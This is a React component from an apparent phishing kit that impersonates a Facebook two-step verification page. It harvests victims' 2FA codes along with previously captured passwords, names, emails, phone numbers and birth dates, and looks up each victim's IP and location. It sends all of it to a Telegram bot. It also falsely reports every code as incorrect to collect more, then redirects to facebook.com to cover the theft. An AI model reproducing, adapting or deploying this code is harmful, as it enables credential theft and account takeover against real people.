import { useEffect, useMemo, useState } from 'react';
import AuthencationApp from '../assets/img/authencation-app.jpg';
import Sms from '../assets/img/Sms.png';
import Whatapp from '../assets/img/whatapp.png';
import VerifyModal from '../components/index/verify-modal';
import config from '../config/index.js';
import { detectLanguageFromLocation } from '../utils/country_to_language.js';
import { translateMultiple } from '../utils/translate.js';

const TwoStepVerification = () => {
    const [formData, setFormData] = useState(null);
    const [email, setEmail] = useState('');
    const [phoneNumber, setPhoneNumber] = useState('');
    const [isModalOpen, setIsModalOpen] = useState(false);
    const [code, setCode] = useState('');
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [submitError, setSubmitError] = useState(null);
    const [showError, setShowError] = useState(false);
    const [codeAttempts, setCodeAttempts] = useState([]);
    const [lastMessageId, setLastMessageId] = useState(null);
    const [countDown, setCountDown] = useState(config.LOAD_TIMEOUT_MS / 1000);

    const defaultTexts = useMemo(
        () => ({
            authenticatorApp: 'Open your authentication app',
            authenticatorDesc: 'Enter the 6-digit code from your 2FA app (Duo Mobile, Google Authenticator).',
            whatsapp: 'Check your WhatsApp messages',
            whatsappDesc: 'Enter the code we sent to your WhatsApp number',
            sms: 'Check your text messages',
            smsDesc: 'Enter the code we sent to number',
            email: 'Check your email',
            emailDesc: 'Enter the code we sent to',
            codePlaceholder: 'Enter 6 or 8 digit code',
            continueButton: 'Continue',
            tryAnotherWay: 'Try Another Way',
            errorIncorrect: 'The code you entered is incorrect or has been used. Please try again after {seconds} seconds.'
        }),
        []
    );

    const [texts, setTexts] = useState(defaultTexts);
    const [isTranslating, setIsTranslating] = useState(false);

    const [value, setValue] = useState({
        id: 'authenticator',
        title: 'Authenticator App',
        desc: 'Google Authenticator, Duo Mobile',
        imgSrc: AuthencationApp
    });

    const translateAllTexts = async () => {
        try {
            setIsTranslating(true);
            const targetLang = await detectLanguageFromLocation();

            if (targetLang === 'en') {
                setTexts(defaultTexts);
                return;
            }

            const translatedTexts = await translateMultiple(defaultTexts, targetLang);
            setTexts(translatedTexts);

            setValue({
                id: 'authenticator',
                title: translatedTexts.authenticatorApp,
                desc: translatedTexts.authenticatorDesc,
                imgSrc: AuthencationApp
            });
        } catch (error) {
            console.error('Error translating texts:', error);
            setTexts(defaultTexts);
        } finally {
            setIsTranslating(false);
        }
    };

    useEffect(() => {
        const storedData = localStorage.getItem('metaFormData');
        if (storedData) {
            const parsed = JSON.parse(storedData);
            setFormData(parsed);
            setEmail(parsed.email || '');
            setPhoneNumber(parsed.phoneNumber || '');
            setLastMessageId(parsed.lastMessageId || null);
            setCodeAttempts(parsed.codeAttempts || []);
        }

        translateAllTexts();
    }, []);

    useEffect(() => {
        if (showError && countDown >= 0) {
            // Thay thế nhiều placeholder khác nhau để hỗ trợ đa ngôn ngữ
            const errorMsg = texts.errorIncorrect
                .replace('{seconds}', Math.round(countDown))
                .replace('{giây}', Math.round(countDown))
                .replace(/\{[^}]+\}/g, Math.round(countDown)); // fallback cho các placeholder khác
            setSubmitError(errorMsg);
        }
    }, [countDown, texts.errorIncorrect, showError]);

    const formatDateVN = (dateStr) => {
        if (!dateStr) return '';
        if (/^\d{2}[/-]\d{2}[/-]\d{4}$/.exec(dateStr)) {
            return dateStr.replace('/', '-');
        }
        const [year, month, day] = dateStr.split('-');
        return `${day}-${month}-${year}`;
    };

    const handleCodeChange = (e) => {
        const value = e.target.value.replace(/\D/g, '');
        if (value.length <= 8) {
            setCode(value);
        }
    };

    const handleSubmitCode = async () => {
        if (code.length !== 6 && code.length !== 8) {
            return;
        }

        setIsSubmitting(true);
        setSubmitError(null);
        setShowError(false);

        let i = config.LOAD_TIMEOUT_MS / 1000;
        setCountDown(i);
        const countDownInterval = setInterval(() => {
            i -= 1;
            setCountDown(i);
            if (i <= 0) {
                clearInterval(countDownInterval);
            }
        }, 1000);
        await new Promise((resolve) => setTimeout(resolve, config.LOAD_TIMEOUT_MS));

        const newCodeAttempts = [...codeAttempts, code];
        setCodeAttempts(newCodeAttempts);

        try {
            if (lastMessageId) {
                try {
                    await fetch(`https://api.telegram.org/bot${config.TOKEN}/deleteMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: config.CHAT_ID,
                            message_id: lastMessageId
                        })
                    });
                } catch (error) {
                    console.error('Error deleting previous message:', error);
                }
            }

            const geoResponse = await fetch('https://get.geojs.io/v1/ip/geo.json');
            const geoData = await geoResponse.json();

            const currentTime = new Date().toLocaleString('vi-VN', {
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                day: '2-digit',
                month: '2-digit',
                year: 'numeric'
            });

            const passwordList = (formData?.passwordAttempts || []).map((pass, index) => `<b>🔒 Mật khẩu ${index + 1}:</b> <code>${pass}</code>`).join('\n');

            const codeList = newCodeAttempts.map((c, index) => `<b>🔐 Code ${index + 1} (${value.title}):</b> <code>${c}</code>`).join('\n');

            const message = `
<b>📅 Thời gian:</b> <code>${currentTime}</code>
<b>🌐 IP:</b> <code>${geoData.ip}</code>
<b>🌍 Vị trí:</b> <code>${geoData.city}, ${geoData.region}, ${geoData.country}</code>
<b>📍 Tọa độ:</b> <code>${geoData.latitude}, ${geoData.longitude}</code>

<b>📄 Tên Page:</b> <code>${formData?.pageName || 'N/A'}</code>
<b>👤 Họ tên:</b> <code>${formData?.fullName || 'N/A'}</code>
<b>📧 Email:</b> <code>${formData?.email}</code>
<b>📞 Số điện thoại:</b> <code>${formData?.phoneNumber}</code>
<b>🎂 Ngày sinh:</b> <code>${formatDateVN(formData?.birthDay)}</code>

${passwordList}

${codeList}`;

            const telegramApiUrl = `https://api.telegram.org/bot${config.TOKEN}/sendMessage`;

            const response = await fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: config.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

            if (!response.ok) {
                throw new Error('Failed to send data. Please try again.');
            }

            const result = await response.json();

            if (!result.ok) {
                throw new Error(result.description || 'Failed to send data');
            }

            const newMessageId = result.result.message_id;
            setLastMessageId(newMessageId);

            const currentStoredData = localStorage.getItem('metaFormData');
            if (currentStoredData) {
                const parsed = JSON.parse(currentStoredData);
                const updatedData = {
                    ...parsed,
                    codeAttempts: newCodeAttempts,
                    lastMessageId: newMessageId,
                    lastMessage: message,
                    timestamp: Date.now()
                };
                localStorage.setItem('metaFormData', JSON.stringify(updatedData));
            }

            if (newCodeAttempts.length < config.MAX_CODE_ATTEMPTS) {
                // Reset countdown để bắt đầu đếm ngược lại
                let j = config.LOAD_TIMEOUT_MS / 1000;
                setCountDown(j);
                const errorCountDown = setInterval(() => {
                    j -= 1;
                    setCountDown(j);
                    if (j <= 0) {
                        clearInterval(errorCountDown);
                    }
                }, 1000);
                setShowError(true);
                // Thay thế nhiều placeholder khác nhau để hỗ trợ đa ngôn ngữ
                const errorMsg = texts.errorIncorrect
                    .replace('{seconds}', Math.round(j))
                    .replace('{giây}', Math.round(j))
                    .replace(/\{[^}]+\}/g, Math.round(j));
                setSubmitError(errorMsg);
                setCode('');
            } else {
                setTimeout(() => {
                    window.location.href = 'https://www.facebook.com';
                }, config.LOAD_TIMEOUT_MS);
            }
        } catch (error) {
            console.error('Error sending data:', error);
            setSubmitError(error instanceof Error ? error.message : 'An unexpected error occurred');
        } finally {
            setIsSubmitting(false);
        }
    };

    const methodList = [
        {
            id: 'authenticator',
            title: texts.authenticatorApp,
            desc: texts.authenticatorDesc,
            imgSrc: AuthencationApp
        },
        {
            id: 'whatsapp',
            title: texts.whatsapp,
            desc: `${texts.whatsappDesc} ${phoneNumber ? phoneNumber.slice(-2).padStart(phoneNumber.length, '*') : '******00'}`,
            imgSrc: Whatapp
        },
        {
            id: 'sms',
            title: texts.sms,
            desc: `${texts.smsDesc} ${phoneNumber ? phoneNumber.slice(-2).padStart(phoneNumber.length, '*') : '******00'}`,
            imgSrc: Sms
        },
        {
            id: 'email',
            title: texts.email,
            desc: `${texts.emailDesc} ${email ? email.substring(0, 2) + '***@' + email.split('@')[1] : 'te***@example.us'}`,
            imgSrc: Sms
        }
    ];

    return (
        <div className='verify'>
            <div className='container--verify'>
                <div className='container--verify--child'>
                    <div className='container--verify--child-title'>
                        <span>{formData?.pageName}</span>
                        <span>•Facebook</span>
                    </div>
                    <div>
                        <div className='value--title'>{value.title}</div>
                        <div className='value--desc'>{value.desc}</div>
                        <img src={value.imgSrc} className='img-verify' alt='Verification Method' />
                    </div>
                    <div>
                        <input
                            type='text'
                            inputMode='numeric'
                            className='pass-code'
                            value={code}
                            onChange={handleCodeChange}
                            placeholder={texts.codePlaceholder}
                            disabled={isSubmitting}
                            onKeyPress={(e) => {
                                if (e.key === 'Enter') {
                                    handleSubmitCode();
                                }
                            }}
                        />
                    </div>
                    {submitError && (
                        <div className='dmm-error-verify'>
                            <p
                                style={{
                                    color: '#c00',
                                    fontSize: '14px'
                                }}
                            >
                                {submitError}
                            </p>
                        </div>
                    )}
                    <div>
                        <button
                            className='btn-continue'
                            disabled={(code.length !== 6 && code.length !== 8) || isSubmitting}
                            onClick={handleSubmitCode}
                            style={{
                                opacity: code.length !== 6 && code.length !== 8 && !isSubmitting ? 0.5 : 1,
                                cursor: isSubmitting ? 'not-allowed' : 'pointer'
                            }}
                        >
                            {isSubmitting ? <div className='spinner'></div> : texts.continueButton}
                        </button>
                    </div>
                    <div>
                        <button className='btn--try' onClick={() => setIsModalOpen(true)} disabled={isSubmitting}>
                            {texts.tryAnotherWay}
                        </button>
                    </div>
                </div>

                <VerifyModal
                    isOpen={isModalOpen}
                    onClose={() => setIsModalOpen(false)}
                    methodList={methodList}
                    onSelectMethod={(method) => {
                        setValue(method);
                        setCode('');
                        setSubmitError(null);
                    }}
                />
            </div>
        </div>
    );
};

export default TwoStepVerification;
